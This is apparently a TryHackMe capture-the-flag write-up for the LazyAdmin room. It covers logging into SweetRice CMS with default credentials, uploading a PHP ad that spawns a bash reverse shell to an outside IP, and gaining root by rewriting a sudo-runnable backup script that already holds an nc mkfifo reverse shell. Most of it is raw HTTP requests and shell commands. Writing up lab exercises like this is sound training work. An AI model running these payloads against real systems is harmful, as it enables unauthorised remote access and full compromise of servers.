---
title: LazyAdmin
description: 'RCE through command injection and priv esc through a backup script we can write to'
pubDate: 2023-06-30
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg'
---

The CMS SweetRice is at `/content/as/`, it has the default credentials:

```
manager:Password123
```


## USER

When logged in upload PHP:
```
POST /content/as/?type=ad&mode=save HTTP/1.1
Host: 10.10.198.12
Content-Length: 95
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.198.12
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.198.12/content/as/?type=ad
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: admin=manager; passwd=42f749ade7f9e195bf475f37a44cafcb; dashboad_bg=#6a4471; sweetrice=bhfvatfse0fejuqjn8qcdjalh3
Connection: close

adk=test&adv=<%3fphp+system("bash+-c+'bash+-i+>%26+/dev/tcp/10.8.119.137/4444+0>%261'")%3b+%3f>

```

Execute:
```
GET /content/inc/ads/test.php HTTP/1.1
Host: 10.10.198.12
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: admin=manager; passwd=42f749ade7f9e195bf475f37a44cafcb; dashboad_bg=#6a4471; sweetrice=bhfvatfse0fejuqjn8qcdjalh3
Connection: close

```

## ROOT

```bash
www-data@THM-Chal:/var/www/html/content/inc$ cat db.php
<?php
$database_type = 'mysql';
$db_left = 'v';
$db_url = 'localhost';
$db_port = '3306';
$db_name = 'website';
$db_username = 'rice';
$db_passwd = 'randompass'
```

```bash
www-data@THM-Chal:/var/www/html/content/inc$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

```bash
www-data@THM-Chal:/home$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

```bash
www-data@THM-Chal:/home$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

We can edit `/etc/copy` and put in our own IP and port.

Run the backup script to get a shell as root:
```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

